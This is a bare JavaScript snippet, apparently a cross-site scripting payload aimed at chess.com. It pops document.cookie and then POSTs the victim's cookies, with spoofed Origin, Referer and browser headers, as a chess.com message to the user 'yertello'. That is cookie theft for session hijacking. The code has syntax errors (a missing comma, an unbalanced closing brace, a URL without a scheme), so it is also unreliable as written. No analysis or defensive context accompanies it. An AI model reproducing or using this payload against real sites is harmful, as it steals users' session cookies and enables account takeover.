alert(document.cookie)
console.log(1)
fetch('www.chess.com/callback/messages/yertello',{
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Accept': 'application/json, text/plain, */*',
    'Cookie': document.cookie,
    'Origin': 'https://www.chess.com',
    'Referer': 'https://www.chess.com/messages/yertello',
    'Sec-Ch-Ua':'"Microsoft Edge";v="117", "Not;A=Brand";v="8", "Chromium";v="117"'
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36'
  },
  body: {
    "message":document.cookie
  })
})
